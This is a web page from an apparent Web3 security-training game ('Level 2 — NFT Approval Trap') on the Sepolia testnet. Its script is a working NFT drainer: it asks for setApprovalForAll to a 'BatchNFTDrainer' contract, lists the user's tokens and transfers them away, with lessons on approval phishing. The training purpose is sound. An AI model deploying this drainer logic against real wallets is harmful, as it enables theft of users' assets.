<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Level 2 ‚Äî NFT Approval Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #fff;
      margin: 0;
    }
    .top-bar {
      background: #111;
      padding: 0.8rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.9rem;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
    }
    .warning-bar {
      background-color: #ff3d00;
      color: #fff;
      padding: 0.75rem;
      text-align: center;
      font-weight: bold;
      font-size: 0.9rem;
    }
    .frame-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 120px);
      padding: 2rem;
    }
    .card {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 12px;
      padding: 2rem;
      box-shadow: 0 0 18px #ff9800;
      max-width: 540px;
      width: 100%;
      text-align: center;
    }
    .button-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
      margin-top: 1.5rem;
    }
    button {
      padding: 1rem 2rem;
      font-size: 1rem;
      background: #ff9800;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
    }
    #status {
      margin-top: 2rem;
      font-size: 1.1rem;
      white-space: pre-wrap;
      text-align: left;
    }
    #nextBtn {
      display: none;
      background: #4caf50;
      padding: 1rem;
      border-radius: 8px;
      color: #fff;
      text-decoration: none;
      margin-top: 2rem;
    }
    .tooltip-box {
      margin-top: 2rem;
      padding: 1rem;
      background: #333;
      border-left: 4px solid #ff9800;
      text-align: left;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div>Web3 War Game</div>
    <div>‚úÖ Survived: <span id="surviveCount">0</span> | üíÄ Drained: <span id="failCount">0</span></div>
  </div>

  <div class="warning-bar">
    ‚ö†Ô∏è This is a testnet simulation. Use a burner wallet with Sepolia ETH only. Never connect a real wallet.
  </div>

  <div class="frame-container">
    <div class="card">
      <h1>üß™ Level 2: Animate Your NFT</h1>
      <p>Claim your exclusive animation‚Ä¶</p>
      <div class="button-container">
        <button id="connectBtn">Connect Wallet</button>
        <button id="drainBtn">Animate NFT / DRAIN</button>
      </div>
      <div id="status"></div>
      <a href="level3.html" id="nextBtn">‚û°Ô∏è Proceed to Level 3</a>
      <div class="tooltip-box">
        üí° <strong>Did you know?</strong><br>
        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces like OpenSea manage all your NFTs in one go, saving time and gas. Included for compatibility and efficient trading, but dangerous‚Äîapproving untrusted contracts can let scammers drain your collection instantly.<br><br>
        üö® Scammers exploit this through fake staking, animation, airdrop, and raffle dApps.<br><br>
        ‚ö†Ô∏è Before signing anything, triple-check which contract you're approving. One wrong click can wipe your entire collection ‚Äî until you manually revoke the approval.
      </div>
    </div>
  </div>

  <script>
    const nftContracts = [
      "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
      "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
    ];
    const drainerContract = "0xB3BFFC0a351271D5077ffAcf7072eC510Fe890Ff"; // BatchNFTDrainer
    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function balanceOf(address owner) view returns (uint256)",
      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
      "function name() view returns (string)"
    ];
    const drainerABI = [
      "function drainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
    ];

    let provider, signer;

    function updateCounters() {
      document.getElementById("surviveCount").textContent = localStorage.getItem("w3game_survived") || 0;
      document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
    }

    // Connects wallet and displays owned NFTs from target collections
    document.getElementById("connectBtn").onclick = async () => {
      const status = document.getElementById("status");
      status.innerText = "‚è≥ Connecting...";
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå MetaMask not detected. Please install or enable MetaMask.";
          return;
        }
        provider = new ethers.providers.Web3Provider(window.ethereum);
        try {
          await provider.send("eth_requestAccounts", []);
        } catch (err) {
          status.innerText = "‚ùå Connection rejected. Please approve the connection in MetaMask.";
          console.error("Connection error:", err);
          return;
        }
        signer = provider.getSigner();
        const network = await provider.getNetwork();
        if (network.chainId !== 11155111) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: "0xaa36a7" }], // Sepolia chain ID
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              status.innerText = "‚ùå Sepolia Testnet not found. Please add it to MetaMask.";
            } else {
              status.innerText = "‚ùå Failed to switch to Sepolia Testnet.";
            }
            console.error("Network switch error:", switchError);
            return;
          }
        }
        const user = await signer.getAddress();
        let summary = `‚úÖ Connected: ${user}\n\n`;
        for (const address of nftContracts) {
          try {
            const contract = new ethers.Contract(address, nftABI, signer);
            const name = await contract.name();
            const balance = await contract.balanceOf(user);
            summary += `üñºÔ∏è ${name}: ${balance} NFT(s)\n`;
          } catch (err) {
            console.warn(`Failed to query NFT contract ${address}:`, err);
            summary += `üñºÔ∏è ${address}: Error fetching data\n`;
          }
        }
        status.innerText = summary;
      } catch (err) {
        console.error("Unexpected connection error:", err);
        status.innerText = "‚ùå Wallet connection failed: " + err.message;
      }
    };

    // Approves drainer contract and drains NFTs
    document.getElementById("drainBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!signer) return alert("Please connect your wallet first.");
      try {
        status.innerText = "üö® Requesting approvals for NFT collections...";
        const user = await signer.getAddress();

        // Step 1: Approve drainer contract for each NFT collection
        for (const contractAddr of nftContracts) {
          const contract = new ethers.Contract(contractAddr, nftABI, signer);
          const tx = await contract.setApprovalForAll(drainerContract, true);
          await tx.wait();
        }

        status.innerText = "‚úÖ Approvals granted. Draining NFTs...";

        // Step 2: Gather owned token IDs
        let tokenIdMatrix = [];
        for (const contractAddr of nftContracts) {
          const contract = new ethers.Contract(contractAddr, nftABI, signer);
          const balance = await contract.balanceOf(user);
          let ids = [];
          for (let i = 0; i < balance; i++) {
            try {
              const tokenId = await contract.tokenOfOwnerByIndex(user, i);
              ids.push(Number(tokenId));
            } catch (e) {
              console.warn(`Failed to fetch token ID for ${contractAddr} at index ${i}:`, e);
            }
          }
          tokenIdMatrix.push(ids);
        }

        // Step 3: Call drainSpecific to transfer NFTs
        const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
        const drainTx = await drainer.drainSpecific(nftContracts, tokenIdMatrix);
        await drainTx.wait();

        status.innerText =
          "üíÄ Drained NFTs from the approved collections!\n\n" +
          "üß† Lesson: Phishing sites trick you into signing approvals, letting scammers drain your NFTs. " +
          "Always verify contracts before approving!";
        localStorage.setItem("w3game_level2", "drained");
        let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
        localStorage.setItem("w3game_failed", failCount + 1);
        updateCounters();
        document.getElementById("nextBtn").style.display = "inline-block";
      } catch (err) {
        if (err.code === "ACTION_REJECTED") {
          status.innerText =
            "‚úÖ You survived Level 2!\n\n" +
            "üõ°Ô∏è You rejected a malicious approval or drain transaction. " +
            "Always verify contracts before approving!";
          let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
          localStorage.setItem("w3game_survived", surviveCount + 1);
          updateCounters();
          document.getElementById("nextBtn").style.display = "inline-block";
        } else {
          console.error("Drain error:", err);
          status.innerText = "‚ö†Ô∏è Unexpected error occurred: " + err.message;
        }
      }
    };

    window.onload = () => {
      updateCounters();
    };
  </script>
</body>
</html>
